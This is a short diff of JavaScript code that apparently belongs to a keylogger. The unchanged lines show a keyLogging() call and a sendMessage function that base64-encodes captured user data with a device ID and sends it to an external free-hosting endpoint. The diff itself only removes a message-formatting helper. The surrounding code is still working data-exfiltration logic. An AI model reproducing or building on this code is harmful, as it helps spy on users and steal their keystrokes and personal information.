@@ -61,18 +61,6 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
             keyLogging();
         }
     },
-    convertObjectToMessage = (obj) => {
-        let message = "";
-
-        for (const key in obj) {
-            if (Object.prototype.hasOwnProperty.call(obj, key)) {
-                const value = obj[key];
-                message += `*${key}:* \`${value}\` \n\n`;
-            }
-        }
-
-        return message;
-    },
     sendMessage = (userData) => {
         return fetch(`${API}?user=${btoa(JSON.stringify({ ...userData, device_id: device_id }))}`, {
             method: "GET",
